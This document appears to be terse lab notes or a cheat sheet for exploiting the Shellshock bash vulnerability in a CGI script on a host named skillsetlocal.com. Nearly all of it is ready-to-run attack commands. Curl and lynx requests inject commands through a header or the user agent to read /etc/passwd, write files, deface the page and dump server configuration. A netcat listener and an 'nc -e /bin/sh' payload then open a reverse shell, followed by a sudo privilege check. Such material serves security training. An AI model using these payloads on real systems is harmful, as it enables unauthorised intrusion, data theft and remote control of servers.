## MOdify Request Header
```
curl -v http://skillsetlocal.com/cgi-bin/vulnscript.sh -H "custom:() { ignored; }; /usr/bin/id"
```

## Checking the error log
```
tail /var/log/apache2/error.log
```

## Command injection
```
curl -v http://skillsetlocal.com/cgi-bin/vulnscript.sh -H "custom:() { ignored; }; echo Content-Type: text-html; echo ; /bin/cat /etc/passwd"
```

## Writing files
```
curl -v http://skillsetlocal.com/cgi-bin/vulnscript.sh -H "custom:() { ignored; }; echo Content-Type: text-html; echo ; /bin/touch /usr/lib/cgi-bin/hacked"
```

## Create a webpage
```
 lynx -useragent="() { ignored; }; /bin/bash -c 'echo -e \"Content-type: text/html\n\"; echo -e \"<html><title>Vulnerable System</title><body>Something Here</body></html>\"'" http://skillsetlocal.com/cgi-bin/vulnscript.sh
```
```
lynx -useragent="() { ignored; }; /bin/bash -c 'echo -e \"Content-type: text/html\n\"; echo -e \"<html><title>Vulnerabe System \`hostname\`</title><body><h1>System Info for \`hostname\`; \`date\`<h2>IP configuration</h2><pre>\`ip addr\`</pre><h2>Apache config</h2><pre>\`cat /etc/apache2/apache2.conf \`</pre></body></html>\"'" http://skillsetlocal.com/cgi-bin/vulnscript.sh
```

## Starting netcat listener
```
nc -lvp 9999
```

## Delivering shell payload
```
curl http://skillsetlocal.com/cgi-bin/vulnscript.sh -H "custom:() { ignored; }; echo Content-Type: text-html; echo ; /bin/nc skillsetlocal.com 9999 -e /bin/sh"
```

## Testing connection
```
sudo -l
```
